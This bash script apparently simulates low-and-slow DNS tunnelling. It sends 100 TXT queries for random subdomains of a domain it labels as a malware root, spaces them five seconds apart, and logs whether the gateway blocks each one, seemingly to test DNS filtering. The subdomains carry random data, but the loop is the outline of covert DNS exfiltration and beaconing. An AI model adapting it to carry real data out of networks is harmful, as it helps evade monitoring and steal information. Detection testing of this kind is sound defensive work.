#!/bin/bash

GATEWAY_IP="192.168.50.1"
MALWARE_ROOT="api-telemetry.com"

echo "[*] Starting Low-and-Slow Attack..."

for i in {1..100}
do
    PAYLOAD=$(tr -dc 'a-z0-9' < /dev/urandom | head -c 32)
    DOMAIN="${PAYLOAD}.${MALWARE_ROOT}"

    dig +short +time=1 +tries=1 TXT "$DOMAIN" @"$GATEWAY_IP" > /dev/null 2>&1
    STATUS=$?

    if [ $STATUS -eq 0 ]; then
        echo "[SUCCESS] Packet $i -> $DOMAIN"
    elif [ $STATUS -eq 9 ]; then
        if ping -c 1 -W 1 "$GATEWAY_IP" > /dev/null 2>&1; then
            echo "[SUCCESS] Packet $i -> $DOMAIN"
        else
            echo "[FAILED ] Packet $i -> $DOMAIN (Blocked)"
        fi
    else
        echo "[FAILED ] Packet $i -> $DOMAIN"
    fi

    sleep 5
done

echo "[+] Low-and-Slow Attack Completed"
